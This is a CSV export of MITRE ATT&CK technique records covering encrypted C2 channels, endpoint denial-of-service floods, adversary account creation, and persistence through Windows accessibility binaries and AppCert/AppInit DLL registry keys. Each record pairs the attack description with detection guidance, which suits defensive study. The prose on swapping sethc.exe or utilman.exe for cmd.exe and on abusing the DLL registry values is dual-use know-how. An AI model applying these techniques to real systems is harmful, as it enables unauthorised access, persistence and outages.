ID,STIX ID,name,description,url,created,last modified,domain,version,tactics,detection,platforms,data sources,is_sub_technique,parent_technique,defenses bypassed,contributors,permissions required,supports remote,system requirements,impact type,effective permissions,relationship citations
T1573.001,attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41,Encrypted Channel: Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",https://attack.mitre.org/techniques/T1573/001,16 March 2020,26 March 2020,enterprise-attack,1.0,Command and Control,"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1573,,,,,,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: FireEye CARBANAK June 2017),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Forcepoint Monsoon),(Citation: ESET Casbaneiro Oct 2019),(Citation: Microsoft DUBNIUM July 2016),(Citation: CISA WellMess July 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: Trend Micro Tick November 2019),(Citation: Red Canary NETWIRE January 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: Zscaler Higaisa 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Novetta Blockbuster),(Citation: Bitdefender APT28 Dec 2015),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Novetta-Axiom),(Citation: McAfee Lazarus Nov 2020),(Citation: Sofacy Komplex Trojan),(Citation: Talos MuddyWater Jan 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Proofpoint Azorult July 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Frankenstein June 2019),(Citation: ESET Dukes October 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: ESET Sednit Part 3),(Citation: FireEye APT30),(Citation: Recorded Future REDDELTA July 2020),(Citation: Check Point APT34 April 2021),(Citation: Baumgartner Naikon 2015),(Citation: Lunghi Iron Tiger Linux),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye Poison Ivy),(Citation: FireEye APT33 Guardrail),(Citation: CheckPoint Bandook Nov 2020),(Citation: Dell Sakula),(Citation: Proofpoint TA459 April 2017),(Citation: GitHub QuasarRAT),(Citation: ESET Kobalos Jan 2021),(Citation: FireEye APT10 Sept 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky Carbanak),(Citation: Microsoft PLATINUM April 2016),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Checkpoint IndigoZebra July 2021),(Citation: PWC WellMess July 2020),(Citation: Kaspersky Dridex May 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Okrum July 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET InvisiMole June 2018),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: F-Secure Cosmicduke),(Citation: MSTIC FoggyWeb September 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Nccgroup Gh0st April 2018),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Kaspersky Turla),(Citation: Moran 2014),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: McAfee Lazarus Jul 2020),(Citation: GitHub Sliver Encryption),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: ESET PipeMon May 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Proofpoint TA505 Mar 2018),(Citation: FireEye APT29),(Citation: Palo Alto Networks BBSRAT),(Citation: Securelist APT10 March 2021),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Lotus Blossom Jun 2015),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: ESET Machete July 2019),(Citation: Fidelis Hi-Zor),(Citation: US-CERT BADCALL),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Unit42 BendyBear Feb 2021),(Citation: ESET Zebrocy May 2019),(Citation: Intezer HiddenWasp Map 2019),(Citation: FireEye APT28),(Citation: Proofpoint Bumblebee April 2022),(Citation: Accenture HyperStack October 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Palo Alto Comnie),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: ESET Operation Groundbait),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Kobalos Feb 2021),(Citation: PWC WellMess C2 August 2020),(Citation: Lotus Blossom Dec 2015),(Citation: Unit42 OceanLotus 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: TrendMicro Taidoor),(Citation: ESET Sednit Part 2),(Citation: Chaos Stolen Backdoor),(Citation: CrowdStrike Putter Panda),(Citation: Palo Alto MoonWind March 2017),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: JPCERT ChChes Feb 2017),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Fidelis TrickBot Oct 2016),(Citation: Securelist WhiteBear Aug 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: RotaJakiro 2021 netlab360 analysis),(Citation: JPCert TSCookie March 2018),(Citation: Symantec W32.Duqu),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Mandiant No Easy Breach),(Citation: Scarlet Mimic Jan 2016),(Citation: Proofpoint ZeroT Feb 2017),(Citation: BlackBerry CostaRicto November 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Winnti April 2015),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Volexity Patchwork June 2018),(Citation: Unit42 RDAT July 2020),(Citation: ESET ForSSHe December 2018),(Citation: Rancor Unit42 June 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: ESET Ebury Feb 2014),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: ESET Gazer Aug 2017),(Citation: Chronicle Winnti for Linux May 2019),(Citation: FireEye APT10 April 2017),(Citation: Fidelis Turbo),(Citation: Palo Alto menuPass Feb 2017),(Citation: ESET RTM Feb 2017),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Villeneuve 2011),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: McAfee GhostSecret),(Citation: ESET LightNeuron May 2019),(Citation: Cisco H1N1 Part 2),(Citation: NCC Group Team9 June 2020),"
T1499.003,attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9,Endpoint Denial of Service: Application Exhaustion Flood,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",https://attack.mitre.org/techniques/T1499/003,20 February 2020,25 March 2022,enterprise-attack,1.2,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1499.004,attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0,Endpoint Denial of Service: Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.

Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",https://attack.mitre.org/techniques/T1499/004,20 February 2020,25 March 2022,enterprise-attack,1.2,Impact,"Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,"(Citation: ESET Industroyer),(Citation: CERT-EU DDoS March 2017)"
T1499.001,attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7,Endpoint Denial of Service: OS Exhaustion Flood,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.

Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)

ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",https://attack.mitre.org/techniques/T1499/001,20 February 2020,30 March 2023,enterprise-attack,1.2,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1499.002,attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858,Endpoint Denial of Service: Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.

One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)

Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",https://attack.mitre.org/techniques/T1499/002,20 February 2020,30 March 2023,enterprise-attack,1.3,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1585.003,attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5,Establish Accounts: Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ",https://attack.mitre.org/techniques/T1585/003,27 May 2022,25 October 2022,enterprise-attack,1.1,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).",PRE,,True,T1585,,Francesco Bigarella,,,,,,","
T1585.002,attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a,Establish Accounts: Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)

To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)",https://attack.mitre.org/techniques/T1585/002,01 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,,True,T1585,,,,,,,,"(Citation: Google EXOTIC LILY March 2022),(Citation: FoxIT Wocao December 2019),(Citation: IBM ITG18 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: ESET Lazarus Jun 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Mandiant FIN12 Oct 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: McAfee Honeybee),(Citation: Mandiant APT1),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Proofpoint TA453 March 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: KISA Operation Muzabi),(Citation: Cylance Dust Storm),(Citation: Crowdstrike Indrik November 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: DOJ Iran Indictments March 2018),"
T1585.001,attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928,Establish Accounts: Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. 

Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1585/001,01 October 2020,16 October 2021,enterprise-attack,1.1,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",True,T1585,,,,,,,,"(Citation: Google EXOTIC LILY March 2022),(Citation: ClearSky Pay2Kitten December 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Google TAG Lazarus Jan 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: KISA Operation Muzabi),(Citation: ESET Dukes October 2019),(Citation: Dell Threat Group 2889),(Citation: ClearSky Kittens Back 3 August 2020),"
T1546.008,attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5,Event Triggered Execution: Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",https://attack.mitre.org/techniques/T1546/008,24 January 2020,21 April 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Paul Speulstra, AECOM Global Security Operations Center",Administrator,,,,SYSTEM,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: FireEye APT29 Domain Fronting),(Citation: Mandiant No Easy Breach),(Citation: FireEye APT41 Aug 2019),(Citation: RSA Shell Crew),(Citation: Github PowerShell Empire),(Citation: aptsim),(Citation: Novetta-Axiom),(Citation: TechNet RDP NLA),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet RDP Gateway),(Citation: TechNet Applocker vs SRP)"
T1546.009,attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c,Event Triggered Execution: AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",https://attack.mitre.org/techniques/T1546/009,24 January 2020,10 November 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation","Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) 

Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,"Administrator, SYSTEM",,,,"Administrator, SYSTEM","(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP)"
T1546.010,attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd,Event Triggered Execution: AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)

Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. 

The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",https://attack.mitre.org/techniques/T1546/010,24 January 2020,21 April 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) 

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,Administrator,,Secure boot disabled on systems running Windows 8 and later,,"Administrator, SYSTEM","(Citation: Palo Alto T9000 Feb 2016),(Citation: Eset Ramsay May 2020),(Citation: Trustwave Cherry Picker),(Citation: FBI FLASH APT39 September 2020),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP)"
